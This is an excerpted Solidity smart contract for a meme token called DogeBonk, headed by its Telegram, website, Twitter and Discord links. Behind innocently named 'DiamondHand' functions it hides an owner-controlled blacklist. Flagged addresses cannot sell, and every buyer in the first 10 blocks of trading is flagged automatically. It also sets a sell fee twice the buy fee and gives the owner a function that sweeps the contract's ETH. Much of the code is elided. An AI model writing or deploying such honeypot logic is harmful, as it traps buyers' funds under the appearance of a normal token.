 ...
 * Telegram: https://t.me/DogeBonkERC
 * Website: https://dogebonk.org/
 * Twitter: https://twitter.com/DogeBonkERC
 * Discord: https://discord.com/invite/pNwbRCTf
 */
    ...
    Ownable
{
    ...
    constructor() {
        ...
        rewardTokens.push(address(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84));
...
contract DogeBonk is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    mapping(address => bool) private _basedHodler;
    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
    bool public transferDelayEnabled = true;
    bool public hodlerMode = true;
    ...
    constructor() ERC20("DogeBonk.org", "DOBO") {
        uint256 totalSupply = 100000000 * 1e18;

        swapTokensAtAmount = (totalSupply * 2) / 100;
        maxTxn = (totalSupply * 2) / 100;

        rewardsBuyFee = 40;
        operationsBuyFee = 150;
        liquidityBuyFee = 10;
        totalBuyFees = rewardsBuyFee + operationsBuyFee + liquidityBuyFee;

        rewardsSellFee = 40;
        operationsSellFee = 350;
        liquiditySellFee = 10;
        totalSellFees = rewardsSellFee + operationsSellFee + liquiditySellFee;

        dividendTracker = new DividendTracker();

        operationsWallet = 0xB55b68c61d6e762Ab437C7d15182bf8c3F69D0B0; // set as operations wallet
    ...
    function DiamondHand(address account, bool status) public onlyOwner {
        _basedHodler[account] = status;
    }

    function DiamondHands(address[] calldata accounts, bool status)
        external
        onlyOwner
    {
        for (uint256 i; i < accounts.length; i++) {
            _basedHodler[accounts[i]] = status;
        }
    }

    function setHodlerMode(bool _isHodlerMode) external onlyOwner {
        hodlerMode = _isHodlerMode;
    }
    ...
    function _transfer(
        ...
        if (hodlerMode && from != uniswapV2Pair) {
            require(
                !_basedHodler[from],
        ...
        if (
            tradingActiveBlock + 10 >= block.number &&
            (automatedMarketMakerPairs[from])
        ) {
            _basedHodler[to] = true;
        }
    ...
    function swapBack() private {
        ...
        (success, ) = address(liquidityReceiver).call{
            value: address(this).balance
        }("");
    }

    function withdrawStuckEth() external onlyOwner {
        (bool success, ) = address(liquidityReceiver).call{
            value: address(this).balance
        }("");
